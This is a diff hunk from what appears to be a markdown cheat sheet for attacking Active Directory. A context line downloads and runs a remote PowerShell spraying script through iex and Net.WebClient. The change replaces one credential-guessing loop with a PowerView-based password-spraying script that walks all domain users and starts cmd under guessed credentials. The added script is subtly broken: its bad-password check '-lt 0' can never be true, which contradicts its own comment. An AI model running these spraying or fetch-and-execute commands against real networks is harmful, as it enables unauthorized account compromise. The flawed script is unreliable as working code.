@@ -614,34 +614,35 @@ Get-ADUser -Filter 'Enabled -eq $true' |
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kh4sh3i/Amsi-Bypass/main/dpspray.ps1');dpspray
 ```
 
+Spraying with Start-Process
 ```
-# Domain info
-$Domain = "lab.local"
+# will spray only users that currently have 0 bad password attempts
+# dependency - powerview
 
-# Users and passwords
-$UserList = @("user1","user2")
-$PasswordList = @("Password123","Summer2025!")
-
-foreach ($user in $UserList) {
-    foreach ($pass in $PasswordList) {
-        try {
-            # Create PrincipalContext with explicit domain
-            $pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $Domain)
-
-            # Validate credentials (plain text password)
-            $valid = $pc.ValidateCredentials($user, $pass, [System.DirectoryServices.AccountManagement.ContextOptions]::Negotiate)
-
-            if ($valid) {
-                Write-Output "SUCCESS: $user : $pass"
-            } else {
-                Write-Output "FAILED: $user : $pass"
-            }
-        } catch {
-            Write-Output "ERROR: $user : $pass -> $_"
-        }
-    }
+function Get-BadPasswordCount {
+    param(
+        $username = "username",
+        $domain = "offense.local"
+    )
+    $pdc = (get-netdomain -domain $domain).PdcRoleOwner
+    $badPwdCount = (Get-NetUser $username -Domain $domain -DomainController $pdc.name).badpwdcount
+    return $badPwdCount
 }
 
+$users = Get-netuser -properties samaccountname | Select-Object -ExpandProperty samaccountname
+$domain = "offense.local"
+$password = "123456"
+
+Write-Host $users.Count users supplied; $users | % {
+    $badPasswordCount = Get-BadPasswordCount -username $_ -Domain $domain
+    if ($badPasswordCount -lt 0) {
+        Write-Host Spraying : -NoNewline; Write-host -ForegroundColor Green " $_"
+        $credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @("$domain\$_",(ConvertTo-SecureString -String $password -AsPlainText -Force))
+        Start-Process cmd -Credential ($credentials)
+    } else {
+        Write-Host "Ignoring $_ with $badPasswordCount badPwdCount" -ForegroundColor Red
+    }
+}
 ```
 
 ## 6.1 Do not require Kerberos preauthentication (AS-REP roasting)
